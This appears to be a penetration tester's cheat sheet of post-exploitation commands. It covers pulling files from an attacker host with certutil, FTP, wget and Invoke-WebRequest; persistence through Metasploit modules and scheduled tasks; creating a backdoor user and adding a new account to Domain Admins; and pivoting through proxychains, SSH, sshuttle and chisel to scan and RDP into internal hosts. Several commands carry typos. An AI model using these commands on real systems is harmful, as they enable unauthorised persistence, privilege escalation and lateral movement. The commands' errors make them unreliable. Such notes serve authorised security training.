# Post Exploitation Utilities

## Certiutil
    - Certutil.exe -urlcache -f http://ip/file.txt file.txt
    
## HTTP
    - Python -m SimpleHTTPServer 80
    - Python3 -m http.server 80
    
## FTP
    - Python -m pyftpdlin 21 (Attacker Machine)
    - Ftp <attacker ip>
    
## Linux
    - Wget
    
## Invoke web request (powershell)
    - Invoke-WebRequest $myDownloadUrl -OutFile c:\file.ext

# Maintaining Access

## Persistence Scripts
    - Run persistence -h
    - Exploit/windows/local/persistence
    - Exploit/windows/local/regitry_persistence
    
    
## Scheduled Task
    - Run scheduleme
    - Run schtaskabuse
    
## Add a user
    - Net user hacker password 123 /add
    
    
## Add new user to the domain
    - net user /add hawkeye Password123! /domain

## Add hawkeye to the domain admin group
    - net group "Domain Admins" hawkeye /ADD /DOMAIN

# Pivoting

## Using Proxychains and SSH
    - Cat /etc/proxychains.conf
    - use the port mentioned in the last line of the file eg socks4 127.0.0.1 9050

    - Ssh -f -N -D 9050 -I pivot root@10.10.155.5
        1. -f background
        2. -N  not want to execute remote commands, ideal for port forwarding
        3. -D where to bind the port in this case 9050

Now run commands using proxychains
    
    Proxychains <commands you want to run>
    
    Scanning the target using nmap and proxychains
        - Proxychains nmap -p88 <ip> (scan a particular port)
        - Proxychains nmap <ip> (scan the network for open ports)
        - Proxychains nmap <ip> -sT ( TCP connect scan, by defualt nmap uses SYN scan)
    
    Get RDP using proxychains
        - Proxychains xfreerdp  /u:administrator /p:'Password' /v:<Ip>
    
    Access web sites through proxy chains
     - Proxychains firefox (firefox must be closed before hand)

## Using SSHUTLE
    
    - sshuttle -r root@<ip> <dmzip/class>  --ssh cmd "ssh -I pivot"

## Chisel
    https://www.hackingarticles.in/a-detailed-guide-on-chisel/